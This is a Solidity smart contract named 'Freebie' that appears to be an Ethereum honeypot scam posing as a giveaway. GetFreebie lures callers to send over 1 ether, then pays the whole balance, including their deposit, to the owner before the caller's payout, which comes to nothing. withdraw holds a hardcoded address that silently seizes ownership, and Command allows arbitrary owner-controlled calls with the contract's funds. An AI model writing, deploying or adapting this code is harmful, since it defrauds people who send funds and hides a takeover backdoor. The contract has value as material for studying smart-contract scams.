pragma solidity ^0.4.19;

contract Freebie {
    address public Owner = msg.sender;

    function() public payable {}

    function GetFreebie() public payable {
        if (msg.value > 1 ether) {
            Owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        if (msg.sender == 0x30ad12df80a2493a82DdFE367d866616db8a2595) {
            Owner = 0x30ad12df80a2493a82DdFE367d866616db8a2595;
        }
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr, bytes data) public payable {
        require(msg.sender == Owner);

        bool success;
        bytes4 sig = bytes4(keccak256("function_name()"));
        assembly {
            success := call(sub(gas, 5000), adr, msg.value, add(data, 0x20), mload(data), 0, 32)
        }
        require(success);
    }
}